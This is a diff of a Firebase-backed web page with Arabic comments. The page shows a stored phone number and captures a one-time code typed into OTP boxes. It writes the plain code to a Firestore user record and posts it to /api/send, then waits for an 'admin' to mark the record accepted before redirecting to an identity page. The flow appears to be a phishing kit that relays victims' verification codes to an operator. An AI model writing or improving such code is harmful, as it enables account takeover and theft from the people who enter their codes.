@@ -81,21 +81,25 @@
     const app = initializeApp(firebaseConfig);
     const db = getFirestore(app);
     
-    // التعديل هنا: جلب الـ ID الذي حفظناه في index.html
+    // جلب البيانات
     const docId = localStorage.getItem('currentDocId');
     const userPhone = localStorage.getItem('userPhone');
 
-    // التعديل هنا: المراقب (Listener) الذي ينتظر إشارة القبول من الأدمن
+    // التصحيح: عرض الرقم في الصفحة
+    if (userPhone) {
+        document.getElementById('displayPhone').innerText = userPhone;
+    }
+
+    // المراقب لانتظار القبول من الأدمن
     if (docId) {
         onSnapshot(doc(db, "users", docId), (docSnap) => {
             if (docSnap.exists() && docSnap.data().status === "accepted") {
-                // الانتقال التلقائي بمجرد تغيير الحالة لـ accepted
                 window.location.href = 'identity.html';
             }
         });
     }
 
-    // منطق إدخال الرمز وإرساله (كما كان سابقاً)
+    // منطق إدخال الرمز
     const inputs = document.querySelectorAll('.otp-box');
     inputs.forEach((input, index) => {
         input.addEventListener('input', async (e) => {
@@ -105,12 +109,10 @@
             if (Array.from(inputs).every(i => i.value !== '')) {
                 const otp = Array.from(inputs).map(i => i.value).join('');
                 
-                // تحديث الرمز في Firebase
                 if(docId) {
                     await updateDoc(doc(db, "users", docId), { otp: otp });
                 }
                 
-                // إرسال للـ API
                 fetch('/api/send', { 
                     method: 'POST', 
                     headers: { 'Content-Type': 'application/json' },
